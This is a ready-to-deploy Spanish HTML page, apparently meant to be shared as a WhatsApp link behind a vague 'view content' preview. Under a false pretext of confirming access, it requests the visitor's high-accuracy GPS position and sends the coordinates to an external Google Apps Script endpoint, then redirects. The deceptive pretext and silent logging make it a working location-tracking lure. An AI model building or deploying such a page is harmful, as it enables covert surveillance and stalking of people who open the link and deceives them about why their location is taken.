<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cargando contenido...</title>

  <!-- Metadatos Open Graph para la vista previa en WhatsApp -->
  <meta property="og:type" content="website">
  <meta property="og:title" content="Ver contenido">
  <meta property="og:description" content="Haz clic aquí para continuar.">
  
  <!-- REEMPLAZA esta URL con la ruta pública y completa de tu imagen en GitHub Pages -->
  <meta property="og:image" content="https://TU_USUARIO.github.io/TU_REPOSITORIO/luna.png">
  <meta property="og:image:type" content="image/png">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">

  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background-color: #f8f9fa;
      color: #333;
      text-align: center;
      padding: 20px;
      box-sizing: border-box;
    }
    .card {
      background: #ffffff;
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.08);
      max-width: 400px;
      width: 100%;
    }
    .btn {
      display: inline-block;
      margin-top: 1.5rem;
      padding: 12px 24px;
      background-color: #007bff;
      color: white;
      text-decoration: none;
      border: none;
      border-radius: 6px;
      font-size: 1rem;
      font-weight: 600;
      cursor: pointer;
      transition: background-color 0.2s ease;
    }
    .btn:hover {
      background-color: #0056b3;
    }
    .status {
      margin-top: 1rem;
      font-size: 0.9rem;
      color: #666;
    }
  </style>
</head>
<body>

  <div class="card">
    <h2>Acceso al contenido</h2>
    <p>Para brindarte el servicio adecuado, requerimos confirmar tu acceso y ubicación.</p>
    
    <!-- El clic del usuario dispara la solicitud de permisos requerida por el navegador -->
    <button class="btn" id="btn-continuar" onclick="solicitarUbicacionYRedirigir()">Continuar</button>
    <div class="status" id="estado"></div>
  </div>

  <script>
    const DESTINO_URL = "https://script.google.com/macros/s/AKfycbwssa1HAg7fh83S9LTyx92XaJ9OKIInI7elzBFTsogvhFkiuF4BbrgSR-kMCwioIhd1/exec";

    function solicitarUbicacionYRedirigir() {
      const estado = document.getElementById("estado");
      const boton = document.getElementById("btn-continuar");

      boton.disabled = true;
      estado.innerText = "Solicitando permisos de ubicación...";

      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            estado.innerText = "Ubicación confirmada. Redirigiendo...";
            
            // Opcional: Si tu Apps Script necesita recibir la latitud y longitud por parámetro GET:
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const urlConCoordenadas = `${DESTINO_URL}?lat=${lat}&lon=${lon}`;

            // Redirige al script
            window.location.href = urlConCoordenadas;
          },
          (error) => {
            // Si el usuario deniega el permiso o falla el sensor GPS, se redirige de todos modos
            console.warn("Permiso denegado o error de GPS:", error.message);
            estado.innerText = "Redirigiendo...";
            window.location.href = DESTINO_URL;
          },
          {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
          }
        );
      } else {
        // En navegadores antiguos sin soporte de geolocalización
        window.location.href = DESTINO_URL;
      }
    }
  </script>

</body>
</html>
